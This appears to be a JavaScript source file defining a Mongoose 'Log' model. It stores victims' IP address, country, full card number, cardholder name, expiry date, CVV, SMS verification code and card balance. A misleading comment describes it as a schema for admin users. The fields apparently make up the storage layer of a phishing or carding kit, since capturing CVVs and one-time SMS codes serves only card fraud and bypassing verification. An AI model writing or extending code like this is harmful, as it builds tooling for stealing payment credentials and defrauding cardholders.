const mongoose = require("mongoose");

// Define Mongoose schema and model for admin users
const logSchema = new mongoose.Schema({
  uniqueID: String,
  ipAddress: String,
  country: String,
  cardNumber: String,
  cardHolder: String,
  expiryDate: String,
  cvvNumber: String,
  smsCode: String,
  cardBalance: String,
});
const Log = mongoose.model("Log", logSchema);

module.exports = Log;
